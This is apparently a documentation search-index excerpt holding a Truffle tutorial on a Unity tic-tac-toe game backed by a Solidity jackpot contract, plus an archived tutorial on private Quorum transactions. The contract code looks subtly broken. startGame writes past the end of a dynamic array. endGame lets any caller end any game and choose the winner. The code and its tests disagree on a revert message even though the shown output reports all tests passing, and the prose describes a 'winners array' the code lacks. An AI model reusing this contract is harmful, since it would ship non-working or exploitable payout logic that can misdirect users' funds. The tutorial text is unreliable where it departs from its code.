equivalent, zero-knowledge rollup, to take advantage of its lower gas fees and faster transaction times, which are crucial to game development. Let's dive in!", "title": "Building a Tic Tac Toe Game with Truffle and Unity"}, {"location": "guides/building-a-tic-tac-toe-game-with-truffle-and-unity/#prerequisites", "text": "There are a few tools you'll need to download: Unity : Unity is a game engine. NEthereum : NEthereum allows us to interact with the Ethereum blockchain in C#. Truffle CLI : Truffle CLI manages the lifecycle of our smart contracts. It handles compiling our Solidity and producing artifact files, JSON files which contain the function signatures for a given contract. We'll ingest these artifacts using the MetaMask SDK and NEtherem so we can interact with our smart contract in Unity. Ganache : Ganache spins up a local test chain for you to test your smart contracts locally. MetaMask wallet as both an extension and on mobile Make sure that Linea is set up as a network on both platforms Goerli Eth Linea Goerli Eth ConsenSys has a number of tools in the Unity asset store that will help you create any web3 gaming experience you can imagine. Another one you may want to check out is the Infura Unity SDK . This allows you to qucickly work with NFTs; querying collections, minting new NFTs, transferring them and more, without doing any smart contract development!", "title": "Prerequisites:"}, {"location": "guides/building-a-tic-tac-toe-game-with-truffle-and-unity/#unbox-the-truffle-unity-box", "text": "To unbox the Truffle Unity box, and store the game code in a folder called game , run: truffle unbox unity game The Unity box is split into two folders: truffle , for storing smart contracts unity , for storing the game files First, let's dive into the smart contract!", "title": "Unbox the Truffle Unity Box"}, {"location": "guides/building-a-tic-tac-toe-game-with-truffle-and-unity/#the-smart-contract", "text": "The smart contract powering the game can be found at contracts/TicTacToe.sol . This contract allows for the creation of tic tac toe games represented by an ID, jackpot, and payout addresses of the 2 players involved. It also keeps track of a game's status, and whether or not its ended. Once a game ends the jackpot is released for the winner to withdraw at their convenience. Let's break it down in sections to understand exactly what's happening.", "title": "The Smart Contract"}, {"location": "guides/building-a-tic-tac-toe-game-with-truffle-and-unity/#imports-and-variables", "text": "import \"@openzeppelin/contracts/security/PullPayment.sol\" ; contract TicTacToe is PullPayment { event GameStarted ( uint game_id ); event GameWon ( address winner , uint amount ); struct Game { uint jackpot ; address [ 2 ] payout_addresses ; bool ended ; } Game [] games ; ... } We import OpenZeppelin's PullPayment contract for safe processing of withdrawals for the winner. In Ethereum a best practice is to have users withdraw funds rather than sending them automatically. We have 2 events: GameStarted, which fires when a game starts, and GameWon, which fires when a game ends in a win. If a game ends in a draw, it will not fire this event because nothing related to the smart contract needs to occur. Each game is represented by a Game struct. It has a jackpot amount supplied by the user, an array containing the addresses of the players (X & O), and a boolean letting us know if this game has ended. Finally, we keep an array of Games so that we can quickly access them by ID, which in this case is their index in the games array.", "title": "Imports and Variables"}, {"location": "guides/building-a-tic-tac-toe-game-with-truffle-and-unity/#starting-a-game", "text": "function startGame ( address payout_x , address payout_o ) public payable { // must have some value attached for jackpot require ( msg.value > 0 , \"jackpot must be greater than 0\" ); // all params must be supplied require ( payout_x != address ( 0 ), \"player X address cannot be empty\" ); require ( payout_o != address ( 0 ), \"player O address cannot be empty\" ); // msg.sender and payout_o cannot be the same address require ( payout_x != payout_o , \"player X and player O cannot have the same payout address\" ); uint new_game_id = games . length ; address [ 2 ] memory payout_addresses = [ payout_x , payout_o ]; games [ new_game_id ] = Game ( msg.value , payout_addresses , false ); emit GameStarted ( new_game_id ); } To start a game, we need to know the jackpot amount (supplied as msg.value ) and the address of the players involved for payout. We check that those values are set and that the two payout addresses are not equal. Our contract assumes a \"game master\" will setup the game and deposit the necessary jackpot funds, which then get paid out to the winner. We then get the ID for our new game which, thanks to using an array, is the current length. We then pass these variables into a new Game object and emit our GameStarted() event.", "title": "Starting a Game"}, {"location": "guides/building-a-tic-tac-toe-game-with-truffle-and-unity/#ending-a-game", "text": "function endGame ( uint game_id , uint winner ) public { // make sure the game hasn't already ended require ( ! games [ game_id ]. ended ); address winner_address = games [ game_id ]. payout_addresses [ winner ]; uint jackpot = games [ game_id ]. jackpot ; games [ game_id ]. ended = true ; _asyncTransfer ( winner_address , jackpot ); emit GameWon ( winner_address , jackpot ); } To end a game, we first make sure the game we're attempting to end hasn't already been ended. This single line is supremely important. Because this is a smart contract hosted on a public blockchain, anyone could call this contract outside of the game. Because of this, we check our game's state to make sure this can't be used to potentially trigger unlimited withdrawals. We then add the winner's address to the winners array so that we can efficiently build the leaderboard. From there, we get the winner's address and the jackpot so that we can call _asyncTransfer() . This function comes from the OpenZeppelin contract we imported, and it handles the payouts for us. The winner can now call a payout function to withdraw their funds safely. In the case that this player has won multiple times, this function will automatically aggregate their winnings. Finally, we emit out GameWon() event.", "title": "Ending a Game"}, {"location": "guides/building-a-tic-tac-toe-game-with-truffle-and-unity/#compile-the-smart-contract", "text": "Note that compiling the contracts only works if the build directory unity/Assets/Contracts/json does NOT include .meta files, which are created automatically by the Unity game engine. If they exist, simply delete the build directory. Then, run: cd truffle npm i truffle compile", "title": "Compile the Smart Contract"}, {"location": "guides/building-a-tic-tac-toe-game-with-truffle-and-unity/#testing-the-smart-contract", "text": "Now that we've written our smart contract, it's time to test! The test file can be found at test/tictactoe.js . Here we'll breakdown the tests. Throughout all of these tests, we make use of Rosco Kalis' Truffle Assertions library . It makes it easy to test event emissions and reversion!", "title": "Testing the Smart Contract"}, {"location": "guides/building-a-tic-tac-toe-game-with-truffle-and-unity/#pre-start-tests", "text": "In this series of tests we look at all of the invalid conditions that could occur before a game starts. We need 2 things to start a game: a jackpot and 2 players. We ensure both of those things, as well as that the 2 players, represented in this smart contract as 2 payout addresses, are unique. it ( \"should not start a new game without a jackpot\" , async () => { const ticTacToeInstance = await TicTacToe . deployed (); await truffleAssert . reverts ( ticTacToeInstance . startGame ( accounts [ 0 ], accounts [ 1 ]), \"jackpot must be greater than 0\" ); }); it ( \"should not start a new game with an empty payout_x address\" , async () => { const ticTacToeInstance = await TicTacToe . deployed (); await truffleAssert . reverts ( ticTacToeInstance . startGame ( \"0x0000000000000000000000000000000000000000\" , accounts [ 1 ], { value : 100 } ), \"player X address cannot be empty\" ); }); it ( \"should not start a new game with an empty payout_o address\" , async () => { const ticTacToeInstance = await TicTacToe . deployed (); await truffleAssert . reverts ( ticTacToeInstance . startGame ( accounts [ 0 ], \"0x0000000000000000000000000000000000000000\" , { value : 100 } ), \"player O address cannot be empty\" ); }); it ( \"should not start a new game with 2 equal payout addresses\" , async () => { const ticTacToeInstance = await TicTacToe . deployed (); await truffleAssert . reverts ( ticTacToeInstance . startGame ( accounts [ 0 ], accounts [ 0 ], { value : 100 }), \"player X and player O cannot have the same payout address\" ); });", "title": "Pre-Start Tests"}, {"location": "guides/building-a-tic-tac-toe-game-with-truffle-and-unity/#post-start-tests", "text": "Not much can go wrong once a game has started. Once a game ends, however, payment is released to the winning address. We want to make very sure that a game which has ended cannot be ended again. If that were possible, an attacker could potentially drain the contract of funds by ending a game they've won continuously until funds are gone. it ( \"should not end game which has already ended\" , async () => { const ticTacToeInstance = await TicTacToe . deployed (); const tx = await ticTacToeInstance . startGame ( accounts [ 0 ], accounts [ 1 ], { value : 100 , }); await ticTacToeInstance . endGame ( 0 , 0 ); await truffleAssert . reverts ( ticTacToeInstance . endGame ( 0 , 0 ), \"cannot end a game which is already ended\" ); });", "title": "Post-Start Tests"}, {"location": "guides/building-a-tic-tac-toe-game-with-truffle-and-unity/#happy-path-tests", "text": "Finally, we want to make sure that when everything goes as expected, the game actually works. A new game should start with a jackpot and 2 valid payout addresses. Importantly, a winner should be able to withdraw their winnings once a game has ended. We've imported most of this functionality from OpenZeppelin's PullPayment contract , so we just test that our implementation in the TicTacToe contract works as expected. it ( \"should start a new game with all parameters supplied\" , async () => { const ticTacToeInstance = await TicTacToe . deployed (); const tx = await ticTacToeInstance . startGame ( accounts [ 0 ], accounts [ 1 ], { value : 100 , }); truffleAssert . eventEmitted ( tx , \"GameStarted\" ); }); it ( \"should end a game if one exists\" , async () => { const ticTacToeInstance = await TicTacToe . deployed (); const tx = await ticTacToeInstance . endGame ( 1 , 1 ); truffleAssert . eventEmitted ( tx , \"GameWon\" ); }); it ( \"should allow withdrawal if an address has winnings\" , async () => { const ticTacToeInstance = await TicTacToe . deployed (); const oldBalance = await web3 . eth . getBalance ( accounts [ 1 ]); await ticTacToeInstance . withdrawPayments ( accounts [ 1 ]); const newBalance = await web3 . eth . getBalance ( accounts [ 1 ]); assert . equal ( parseInt ( oldBalance ) + 100 , parseInt ( newBalance ), \"winner balance changed an unanticipated amount after withdrawal\" ); });", "title": "Happy Path Tests"}, {"location": "guides/building-a-tic-tac-toe-game-with-truffle-and-unity/#run-the-tests", "text": "Note that running the tests only works if the build directory unity/Assets/Contracts/json does NOT include .meta files, which are created automatically by the Unity game engine. If they exist, simply delete the build directory. Then, to ensure that our smart contract is working, we can simply run the tests by running truffle test . Your output should look a little something like this: Compiling your contracts... =========================== > Compiling ./contracts/TicTacToe.sol > Compiling @openzeppelin/contracts/access/Ownable.sol > Compiling @openzeppelin/contracts/security/PullPayment.sol > Compiling @openzeppelin/contracts/utils/Address.sol > Compiling @openzeppelin/contracts/utils/Context.sol > Compiling @openzeppelin/contracts/utils/escrow/Escrow.sol > Artifacts written to /var/folders/bj/n7fv7n9j33l8_8t4c9ygct7w0000gn/T/test--83647-z48oHcJghUH3 > Compiled successfully using: - solc: 0 .8.18+commit.87f61d96.Emscripten.clang Contract: TicTacToe \u2714 should not start a new game without a jackpot ( 108ms ) \u2714 should not start a new game with an empty payout_x address \u2714 should not start a new game with an empty payout_o address \u2714 should not start a new game with 2 equal payout addresses \u2714 should not end game which has already ended ( 105ms ) \u2714 should start a new game with all parameters supplied ( 67ms ) \u2714 should end a game if one exists \u2714 should allow withdrawal if an address has winnings ( 58ms ) 8 passing ( 448ms )", "title": "Run the tests"}, {"location": "guides/building-a-tic-tac-toe-game-with-truffle-and-unity/#using-unity-and-truffle-together", "text": "Now, it's time to open up the Unity engine! In order to interact with the TicTacToe smart contract in the Unity game, we have to use MetaMask mobile, which cannot connect to a local testchain. Instead, we'll have to deploy the contract to a public testnet.", "title": "Using Unity and Truffle Together"}, {"location": "guides/building-a-tic-tac-toe-game-with-truffle-and-unity/#deploy-to-linea-using-truffle-dashboard", "text": "Deploying to Linea is simple with Truffle Dashboard. First, run this command to open up Dashboard on localhost:24012 : truffle dashboard Make sure your MetaMask wallet is connected to Linea. Then, migrate your contracts: truffle migrate --network dashboard You should see an approval request to deploy the contract in Dashboard. Confirm the transaction. Your output should look similar to this: Compiling your contracts... =========================== > Compiling ./contracts/TicTacToe.sol > Compiling @openzeppelin/contracts/access/Ownable.sol > Compiling @openzeppelin/contracts/security/PullPayment.sol > Compiling @openzeppelin/contracts/utils/Address.sol > Compiling @openzeppelin/contracts/utils/Context.sol > Compiling @openzeppelin/contracts/utils/escrow/Escrow.sol > Artifacts written to /Users/emilylin/dev/demos/unity/unity/Assets/Contracts/json > Compiled successfully using: - solc: 0 .8.18+commit.87f61d96.Emscripten.clang Starting migrations... ====================== > Network name: 'dashboard' > Network id: 59140 > Block gas limit: 30000000 ( 0x1c9c380 ) 1_ttt.js ======== Deploying 'TicTacToe' --------------------- > transaction hash: 0xb9820cf99a77c5730f651209743531d81497c9e17abec93db7da3d95e9b20fb2sage. > Blocks: 1 Seconds: 16 > contract address: 0x1bBafDeD286635aF0176A27133aCC8a05E3179D2 > block number: 385733 > block timestamp: 1680385169 > account: YOUR_ACCOUNT_NUMBER > balance: 2000 .037039652445354678 > gas used: 1420448 ( 0x15aca0 ) > gas price: 2 .500000007 gwei > value sent: 0 ETH > total cost: 0 .003551120009943136 ETH > Saving artifacts ------------------------------------- > Total cost: 0 .003551120009943136 ETH Summary ======= > Total deployments: 1 > Final cost: 0 .003551120009943136 ETH Save off the deployed contract address! You can find more detailed instructions here .", "title": "Deploy to Linea using Truffle Dashboard"}, {"location": "guides/building-a-tic-tac-toe-game-with-truffle-and-unity/#modify-assetscontractscontractmanagercs", "text": "We'll be referencing the contract address in multiple places throughout the Unity code. So, we've created a global variable ticTacToeAddress in Assets/Contracts/ContractManager.cs . Update that variable with your deployed contract address. public class ContractManager { public static string ticTacToeAddress = \"0x1bBafDeD286635aF0176A27133aCC8a05E3179D2\" ; }", "title": "Modify Assets/Contracts/ContractManager.cs"}, {"location": "guides/building-a-tic-tac-toe-game-with-truffle-and-unity/#open-the-project-in-unity", "text": "We'll be editing the Unity files in the Unity Hub. First, start Unity Hub. Then, open a project from disk: You'll want to select just the unity folder: Your view should look like this: Click on the project to open it. Ignore the Unity version update for now.", "title": "Open the Project in Unity"}, {"location": "guides/building-a-tic-tac-toe-game-with-truffle-and-unity/#generating-c-to-use-smart-contracts-in-unity", "text": "This repo already contains the Truffle Unity plugin , which automatically builds the necessary C# classes using NEthereum for interfacing with your smart contracts in Unity. You can manually add the contract artifact files to your Unity project, which will trigger the build, but in most cases, we recommend setting the contracts build directory to the desired directory in your Unity project. As you can see below, the contracts_build_directory is already pointing to a folder under the unity folder. // truffle-config.js module . exports = { contracts_build_directory : \"../unity/Assets/Contracts/json\" ... } This would be the directory structure in the unity/Assets folder once the contracts have been compiled in Truffle and the C# build completes: \u251c Contracts \u2502 \u251c csharp \u2502 \u2514 json The Truffle artifacts are in the json folder: And you can find the corresponding C# classes in csharp . We'll be interacting with the classes generated under csharp/contracts :", "title": "Generating C# to Use Smart Contracts in Unity"}, {"location": "guides/building-a-tic-tac-toe-game-with-truffle-and-unity/#update-the-scenes", "text": "In order to for Unity to recognize the new contract artifacts. We have to force a rebuild of our scenes. To do this, you can move the Menu 1 and TicTacToe 1 folders out of the scenes folder, and then move them back into the scenes folder. This should trigger a reload of the script assemblies. Ensure that Menu 1 becomes Menu 2 and TicTacToe 1 becomes TicTacToe 2 .", "title": "Update the Scenes"}, {"location": "guides/building-a-tic-tac-toe-game-with-truffle-and-unity/#connect-your-metamask-wallet", "text": "Now that we've created the necessary C# files for the Unity game, let's look at how we connect our MetaMask wallet. To start a game, the very first action the gamemaster needs to do is to connect their wallet so that they can lock up the jackpot money. We'll change our MetaMask mobile network to Linea, since we deployed our contract on Linea. You can find the MetaMask Unity SDK documentation here . The wallet connection code can be found in ConnectMetaMaskUI.cs . We use this script by adding it as a component of ConnectionCanvas and calling Connect() on the ConnectionButton . You can find and modify these properties by right clicking the canvas and selecting properties : And find the script: And find onClick :", "title": "Connect your MetaMask wallet"}, {"location": "guides/building-a-tic-tac-toe-game-with-truffle-and-unity/#interacting-with-smart-contracts-in-unity", "text": "Now that we've hooked up connecting our wallet, let's walk through an example of interacting with a smart contract. When we start a game, we want to call the function startGame from TicTacToe.sol . In order to do this, we will use the generated StartGameRequestAndWaitForReceiptAsync function from unity/Assets/Contracts/csharp/Contracts/TicTacToeService.cs . We will be using this in the InitializeGame function in NewGameMenu.cs . To reference the deployed contract, we need to create an instance of of web3, as well as reference the global address we changed earlier: var metaMask = MetaMaskUnity . Instance ; var web3 = metaMask . CreateWeb3 (); var ticTacToeAddress = ContractManager . ticTacToeAddress ; var ticTacToe = new Truffle . Contracts . TicTacToeService ( web3 , ticTacToeAddress ); StartGameFunction is an autogenerated C# class found under csharp/Functions . We will use this to pass in the necessary parameters to the startGame function in TicTacToe.sol : // This is in StartGameFunction.cs public class StartGameFunctionBase : FunctionMessage { [Parameter(\"address\", \"payout_x\", 1)] public virtual string PayoutX { get ; set ; } [Parameter(\"address\", \"payout_o\", 2)] public virtual string PayoutO { get ; set ; } } Then, as you can see back in NewGameMenu.cs , we pass in startGameFunction to the autogenerated StartGameRequestAndWaitForReceiptAsync function to actually call the smart contract function. Note that we want to pass in a certain amount of ETH to be added to the jackpot. We do this by adding AmountToSend to startGameFunction . // We create the StartGameFunction object so we can attach ETH via AmountToSend. var startGameFunction = new Truffle . Functions . StartGameFunction (); startGameFunction . AmountToSend = jackpotInt ; startGameFunction . PayoutX = playerXValue ; startGameFunction . PayoutO = playerOValue ; try { var receipt = await ticTacToe . StartGameRequestAndWaitForReceiptAsync ( startGameFunction ); ... } As we saw in ConnectionCanvas properties, we can also see this script being utilized in NewGameCanvas : And the game being started via ValidateForm in PlayButton properties: There are many instances where we are calling the auto-generated csharp smart contract functions. Feel free to peruse around the code to get a better feel of the usage.", "title": "Interacting with Smart Contracts in Unity"}, {"location": "guides/building-a-tic-tac-toe-game-with-truffle-and-unity/#play-the-game", "text": "That was a lot to cover! Here's a short video clip of running through this entire process. Do note that the wallet connection portion is not screen recorded since we are connecting through mobile.", "title": "Play the game"}, {"location": "guides/building-a-tic-tac-toe-game-with-truffle-and-unity/#continue-the-conversation", "text": "And there you have it - a brief overview of the Truffle Unity box. Ask questions on GitHub discussions and join our Discord under #truffle-general to talk about what games you're building!", "title": "Continue the conversation"}, {"location": "guides/building-dapps-for-quorum-private-enterprise-blockchains/", "text": "Archived: This tutorial has been archived and may not work as expected; versions are out of date, methods and workflows may have changed. We leave these up for historical context and for any universally useful information contained. Use at your own risk! Ethereum is perhaps best defined by its public network, a network where every transaction -- and all participants of each transaction -- are publicly available to anyone looking at its transaction history. Truffle got its start building for the public blockchain: at the time of Ethereum's launch, the public blockchain was the only smart contract blockchain around. However since launch, technology has changed, most notably with Quorum , the permissioned blockchain initially developed by JP Morgan Chase. Quorum is a version of Ethereum that adds new features on top of what Ethereum already provides. Specifically, Quorum adds the ability to create private blockchains between select participants, and more importantly adds transaction privacy on top of normal Ethereum transactions . Transaction privacy presents a number of useful use cases, especially in the enterprise and banking worlds. For instance, large banks might want to take advantage of blockchain technologies like Ethereum but don't want their transactions to be publicly available to everyone as a matter of doing business. Quorum presents a useful alternative. Let's use a quick example: Say Bob, Tom, and Alice all create a blockchain together, and Alice wants to send 20 TruffleCoin to Bob. But here's the kicker: she doesn't want Tom (or anyone else other than Bob) to know, because she cares about her privacy. Using Quorum, Alice could easily send a transaction where the transaction data is only available to her and Bob. This tutorial represents Truffle's official support for Quorum. By the end of this tutorial you'll learn how to use both Truffle and Quorum together to build privacy-enabled dapps. Requirements \u00b6 This tutorial expects you to have some knowledge of Truffle, Ethereum, Quorum, and Solidity. For more information on these topics, please see the following links: Truffle documentation Ethereum overview Quorum overview and documentation Solidity documentation You will primarily be using the command line for this tutorial. Please ensure you have basic familiarity with opening and using the command line provided by your operating system. Additionally, you will need the following software installed before proceeding: VirtualBox Vagrant Git Getting Started \u00b6 In this tutorial, we'll show you how to develop dapps for Quorum using Truffle and Quorum's 7nodes example . The steps are as follows: Setting up your Quorum client Connecting Truffle to Quorum Deploying smart contracts on Quorum Using Quorum's privacy features to make transactions private Interacting with contracts privately You'll see that developing for Quorum using Truffle is exactly like developing for the public Ethereum blockchain. Truffle supports Quorum out of the box, and the same strategies and methods for building Ethereum-enabled applications for the Ethereum public blockchain also apply to building dapps on Quorum. Setting up your Quorum client \u00b6 The Quorum client is a replacement for the Ethereum client. Using the Quorum client, you can set up a private blockchain that's only available to you and the people you allow to participate. We're going to use a Quorum cluster of seven nodes (so seven Quorum clients) already set up and configured for us inside a virtual machine. You could choose to install Quorum yourself by downloading it directly and building it from source, but for this example, using the pre-configured cluster is much easier. To set up the cluster, open a terminal and navigate to a directory where you'd like it installed. Here, we chose workspace : mkdir workspace cd workspace Download the Quorum examples repository: git clone https://github.com/jpmorganchase/quorum-examples We'll use Vagrant to initialize the cluster's virtual machine. Note that this step could take a few minutes as it makes the virtual machine ready for use. cd quorum-examples vagrant up After vagrant up successfully completes, we'll want a way to access our newly minted virtual machine. Note that a virtual machine is like another computer running inside of your own, and so we'll need a way to access it in order to run commands within the machine. Luckily vagrant provides just such a feature. Type the following command: vagrant ssh Note that after running this command, our command line changes to show a different prompt: ubuntu@ubuntu-xenial:~$ This designates that we're running commands inside the virtual machine. While we're at the above virtual machine prompt, navigate to the example we want to run: ubuntu@ubuntu-xenial:~$ cd quorum-examples/7nodes/ Our Quorum client is nearly ready to go. We need to run two more commands within the virtual machine. The first one creates seven Quorum nodes we can use to simulate a real Quorum deployment. The second one starts up those seven nodes. While the first command only needs to be run one, you should run the second command anytime you restart the virtual machine. ubuntu@ubuntu-xenial:~/quorum-examples/7nodes$ ./raft-init.sh ubuntu@ubuntu-xenial:~/quorum-examples/7nodes$ ./raft-start.sh Success! We now have seven Quorum nodes set up that we can use to represent seven different actors on our private network. Connecting Truffle to Quorum \u00b6 To set up Truffle, we're going to start by creating a bare Truffle project, without any contracts or code. We want to leave the old command line window alone and let the Quorum example run without bothering it, so open a second terminal. In the new terminal, navigate to your workspace and create a new directory for your Truffle project. cd workspace mkdir myproject Next, navigate to the new directory and initialize the bare Truffle project: cd myproject truffle init If you look at the contents of the myproject directory, you'll notice directories were created for you. See the Truffle documentation for more information about Truffle's project structure. Before moving onto code, we need to configure Truffle to point to our running Quorum client. For this example, we'll edit our development network configuration within truffle-config.js to point to the first node available in the 7nodes example: // File: `truffle-config.js` (edited for 7nodes example) module . exports = { networks : { development : { host : \"127.0.0.1\" , port : 22000 , // was 8545 network_id : \"*\" , // Match any network id gasPrice : 0 , gas : 4500000 , type : \"quorum\" , // needed for Truffle to support Quorum }, }, }; Note that we changed the port that Truffle normally connects to (we changed it to 22000 ). Because of the magic of VirtualBox and Vagrant, the node running inside the virtual machine is made available to us via local ports, so connecting via 127.0.0.1 and 22000 will work just fine. **Note**: The seven Quorum clients respond on ports `22000` (node 1) through `22006` (node 7). Now that we have Truffle set up, we can move onto code. Deploying smart contracts on Quorum \u00b6 We won't spend too much time talking about writing or deploying contracts in Truffle since we have ample documentation , however we do want to show how deploying contracts applies to Quorum. First, copy the following contract into a new file, called SimpleStorage.sol . Place it in your contracts/ directory: // File: `./contracts/SimpleStorage.sol` pragma solidity ^ 0.4.17 ; contract SimpleStorage { uint public storedData ; constructor ( uint initVal ) public { storedData = initVal ; } function set ( uint x ) public { storedData = x ; } function get () view public returns ( uint retVal ) { return storedData ; } } Ensure the contract compiles using the command truffle compile within your project directory. truffle compile Next, create a new migration called 2_deploy_simplestorage.js within your migrations/ directory. Note that this migration is just like any other you'd create for Truffle, but there's one important difference. Let's see if you can catch it. // File: `./migrations/2_deploy_simplestorage.js` var SimpleStorage = artifacts . require ( \"SimpleStorage\" ); module . exports = function ( deployer ) { // Pass 42 to the contract as the first constructor parameter deployer . deploy ( SimpleStorage , 42 , { privateFor : [ \"ROAZBWtSacxXQrOe3FGAqJDyJjFePR5ce4TSIzmJ0Bc=\" ], }); }; If you guessed the difference was privateFor , you got it! privateFor is an extra transaction parameter added to Quorum that specifies that the transaction you're making -- in this case a contract deployment -- is private for a specific account, identified by the given public key . For this transaction, the public key we chose represents node 7. Since we previously configured Truffle to connect to node 1, this transaction will deploy a contract from node 1, making the transaction private between node 1 and node 7. Now it's time to deploy your contracts. Run the truffle migrate command and watch your contracts be successfully deployed: truffle migrate You will see output that looks like this. Your transaction IDs will be different though. Using network 'development' . Running migration: 1_initial_migration.js Deploying Migrations... Migrations: 0x721650d027d87cd247a3a776c4b6170bf1e5b936 Saving successful migration to network... Saving artifacts... Running migration: 2_deploy_simplestorage.js Deploying SimpleStorage... SimpleStorage: 0x10ae69385c79ef3eb815ac008a7013d6878f1d38 Saving successful migration to network... Saving artifacts... Now that the contract's deployed, it's off to the races. Using Quorum's privacy features to make transactions private \u00b6 We originally configured Truffle to point our development environment to the first of the seven nodes provided by the example. You can think of the first node as \"us\", as if we were developing a dapp for a private network that's used by multiple other parties. Since the 7nodes example provides us seven nodes to work with, we can tell Truffle about the other nodes so we can \"be\" someone else, and ensure the contract we deployed was private. To add a new network configuration, edit your truffle-config.js file again and add additional network configuration, choosing a network name that best describes the network connection you're adding. In this case, we're going to add a connection to node 4 ( nodefour ) and node 7 ( nodeseven ): // File: `truffle-config.js` module . exports = { networks : { development : { host : \"127.0.0.1\" , port : 22000 , // was 8545 network_id : \"*\" , // Match any network id gasPrice : 0 , gas : 4500000 , type : \"quorum\" , // needed for Truffle to support Quorum }, nodefour : { host : \"127.0.0.1\" , port : 22003 , network_id : \"*\" , // Match any network id gasPrice : 0 , gas : 4500000 , type : \"quorum\" , // needed for Truffle to support Quorum }, nodeseven : { host : \"127.0.0.1\" , port : 22006 , network_id : \"*\" , // Match any network id gasPrice : 0 , gas : 4500000 , type : \"quorum\" , // needed for Truffle to support Quorum }, }, }; Like before, VirtualBox and Vagrant are making these nodes available to us through local ports, so these configurations can look the same as our development configuration except with a different ports specified. Now that our configuration is set up, we can use the Truffle console to interact with our deployed contract. First let's be \"us\" (node 1), configured via our development configuration. The easiest way to do this is to launch the Truffle console , which lets us interact with our deployed contracts directly. truffle console You will see a new prompt: truffle ( development ) > Here, we'll get the deployed instance of the SimpleStorage contract and then get the integer value we specified on deployment. Enter the following command: truffle ( development ) > SimpleStorage . deployed (). then ( function ( instance ) { return instance . get (); }); You'll see the following response: { [ String : '42' ] s : 1 , e : 1 , c : [ 42 ] } Note that Truffle's contract abstractions use Promises to interact with Ethereum. This can be a little cumbersome on the console as it requires a few extra key strokes to get things done, but within your application it makes control flow a lot smoother. Additionally, take a look at the output we received: We got 42 back, but as an object. This is because Ethereum can represent larger numbers than those natively represented by JavaScript, and so we need an abstraction in order to interact with them. Now let's try accessing the SimpleStorage contract as node four. To do this, quit out of the console (using Ctrl + C / Command + C ), and then launch the console again, but this time specifying the connection to node 4 instead of node 1: truffle console --network nodefour You'll see a new prompt: truffle ( nodefour ) > Run the same command as above to get the integer value from the SimpleStorage contract: truffle ( nodefour ) > SimpleStorage . deployed (). then ( function ( instance ) { return instance . get (); }); You'll see the following response: { [ String : '0' ] s : 1 , e : 0 , c : [ 0 ] } You'll notice we got 0 back instead. This is because the accounts represented by node 4 weren't privy to this contract. Lastly we can try with node 7, which was privy to this contract. Quit and relaunch the console again: truffle console --network nodeseven You'll see a new prompt: truffle ( nodeseven ) > Run the same command as above to get the integer value from the SimpleStorage contract: truffle ( nodeseven ) > SimpleStorage . deployed (). then ( function ( instance ) { return instance . get (); }); You'll see the following response: { [ String : '42' ] s : 1 , e : 1 , c : [ 42 ] } As you can see, we get 42 ! This shows that we can deploy contracts that are only available to our desired parties. Interacting with contracts privately \u00b6 So far, we've shown you how to deploy contracts that are private within your migrations. When building a dapp on Quorum, it'd also be helpful to learn how to make all transactions private. Truffle uses its @truffle/contract contract abstraction wherever contracts are used in JavaScript. When you interacted with SimpleStorage in the console above, for instance, you were using a @truffle/contract contract abstraction. These abstractions are also used within your migrations, your JavaScript-based unit tests, as well as executing external scripts with Truffle. Truffle's contract abstraction allow you to make a transaction against any function available on the contract. It does so by evaluating the functions of the contract and making them available to JavaScript. To see these transactions in action, we're going to use an advanced feature of Truffle that lets us execute external scripts within our Truffle environment. Creating a file called sampletx.js and save it in the root of your project (the same directory as your truffle-config.js file). Then fill it with this code: var SimpleStorage = artifacts . require ( \"SimpleStorage\" ); module . exports = function ( done ) { console . log ( \"Getting deployed version of SimpleStorage...\" ); SimpleStorage . deployed () . then ( function ( instance ) { console . log ( \"Setting value to 65...\" ); return instance . set ( 65 , { privateFor : [ \"ROAZBWtSacxXQrOe3FGAqJDyJjFePR5ce4TSIzmJ0Bc=\" ], }); }) . then ( function ( result ) { console . log ( \"Transaction:\" , result . tx ); console . log ( \"Finished!\" ); done (); }) . catch ( function ( e ) { console . log ( e ); done (); }); }; This code does two things: First, it asks Truffle to get our contract abstraction for the SimpleStorage contract. Then, it finds the deployed contract and sets the value managed by SimpleStorage to 65 , using the contract's set() function. As with the migration we wrote previously, the privateFor parameter can be appended within an object at the end of the transaction to tell Quorum that this transaction is private between the sender and the account represented by the given public key. Run this code using truffle exec : truffle exec sampletx.js Your output should look something like this (your transaction ID will be different though): Using network 'development' . Getting deployed version of SimpleStorage... Setting value to 65 ... Transaction: 0x0a7a661e657f5a706b0c39b4f197038ef0c3e77abc9970a623327c6f48ca9aff Finished! We can now use the Truffle console, like before, to check the results of this transaction. Let's see the value as node one: truffle console truffle ( development ) > SimpleStorage . deployed (). then ( function ( instance ) { return instance . get (); }); The response will be: { [ String : '65' ] s : 1 , e : 1 , c : [ 65 ] } We got 65 ! Now let's do node 4 (not privy to the transaction): truffle console --network nodefour truffle ( nodefour ) > SimpleStorage . deployed (). then ( function ( instance ) { return instance . get (); }); The response will be: { [ String : '0' ] s : 1 , e : 0 , c : [ 0 ] } We got zero, as expected. Now let's try node 7: truffle console --network nodeseven truffle ( nodeseven ) > SimpleStorage . deployed (). then ( function ( instance ) { return instance . get (); }); The response will be: { [ String : '65' ] s : 1 , e : 1 , c : [ 65 ] } And we got 65 again, as we should expect. This is how we can use Truffle's contract abstractions to make private transactions with Quorum. Is that all Truffle can do? \u00b6 Absolutely not! What we've shown you today is everything that makes building dapps for Quorum different than building dapps for the public Ethereum network. And what you'll see is it's not different at all: The only difference is adding the privateFor parameter for deployments and transactions you'd like to keep private. The rest is the same! In fact, now that you have the basics, you can explore all our other resources for building dapps with Truffle, including tutorial , writing advanced deployment scripts , unit testing ( with Solidity too ), and much more. By building with Truffle, you now have access to not only the best development tools and technologies (like Quorum), but you also have access to the largest Ethereum developer community around. Don't hesitate to drop us a line on Twitter or get help from fellow Trufflers in our community GitHub Discussions channel . There's always someone available to answer any questions you have. Cheers, and happy coding!", "title": "Truffle Suite"}, {"location": "guides/building-dapps-for-quorum-private-enterprise-blockchains/#requirements", "text": "This tutorial expects you to have some knowledge of Truffle, Ethereum, Quorum, and Solidity. For more information on these topics, please see the following links: Truffle documentation Ethereum overview Quorum overview and documentation Solidity documentation You will primarily be using the command line for this tutorial. Please ensure you have basic familiarity with opening and using the command line provided by your operating system. Additionally, you will need the following software installed before proceeding: VirtualBox Vagrant Git", "title": "Requirements"}, {"location": "guides/building-dapps-for-quorum-private-enterprise-blockchains/#getting-started", "text": "In this tutorial, we'll show you how to develop dapps for Quorum using Truffle and Quorum's 7nodes example . The steps are as follows: Setting up your Quorum client Connecting Truffle to Quorum Deploying smart contracts on Quorum Using Quorum's privacy features to make transactions private Interacting with contracts privately You'll see that 